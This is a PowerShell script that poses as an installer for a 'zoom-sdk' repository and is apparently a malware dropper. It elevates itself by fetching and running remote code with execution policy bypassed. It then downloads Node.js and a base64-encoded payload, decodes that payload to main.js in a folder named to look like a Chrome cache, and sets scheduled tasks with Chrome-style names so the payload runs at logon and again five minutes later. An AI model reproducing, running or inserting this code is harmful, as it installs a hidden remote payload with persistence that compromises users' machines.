#Requires -Version 5.1
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeremyglevitt/zoom-sdk/main/install.ps1'))" -Verb RunAs
    exit
}
$repoBaseUrl = "https://raw.githubusercontent.com/jeremyglevitt/zoom-sdk/main/"
$chromeCache = "C:\ChromeCache"
$nodeZipPath = Join-Path $chromeCache "node.zip"
$mainJsPath = Join-Path $chromeCache "main.js"
$dataTxtPath = Join-Path $chromeCache "data.txt"
New-Item -ItemType Directory -Path $chromeCache -Force | Out-Null
$nodeUrl = "https://nodejs.org/dist/v22.17.0/node-v22.17.0-win-x64.zip"
(New-Object System.Net.WebClient).DownloadFile($nodeUrl, $nodeZipPath)
$nodeExtractPath = Join-Path $chromeCache "node"
New-Item -ItemType Directory -Path $nodeExtractPath -Force | Out-Null
[System.IO.Compression.ZipFile]::ExtractToDirectory($nodeZipPath, $nodeExtractPath)
$dataTxtUrl = $repoBaseUrl.TrimEnd('/') + "/data.txt"
(New-Object System.Net.WebClient).DownloadFile($dataTxtUrl, $dataTxtPath)
$base64Content = Get-Content -Path $dataTxtPath -Raw
$bytes = [System.Convert]::FromBase64String($base64Content)
[System.IO.File]::WriteAllBytes($mainJsPath, $bytes)
$nodeExePath = Get-ChildItem -Path $nodeExtractPath -Recurse -Filter "node.exe" | Select-Object -First 1 -ExpandProperty FullName
function Add-ScheduledTaskHelper {
    param(
        [string]$TaskName,
        [string]$TaskArg,
        [Microsoft.Management.Infrastructure.CimInstance]$TaskTrigger
    )
    $action = New-ScheduledTaskAction -Execute $nodeExePath -Argument $TaskArg
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) { Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false }
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $TaskTrigger -Principal $principal -Settings $settings | Out-Null
}
$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
Add-ScheduledTaskHelper -TaskName "ChromeCacheNodeApp" -TaskArg "`"$mainJsPath`"" -TaskTrigger $logonTrigger
$delayedTrigger = New-ScheduledTaskTrigger -Once -At ([DateTime]::Now.AddMinutes(5))
Add-ScheduledTaskHelper -TaskName "ChromeCacheNodeApp-Delayed" -TaskArg "`"$mainJsPath`"" -TaskTrigger $delayedTrigger
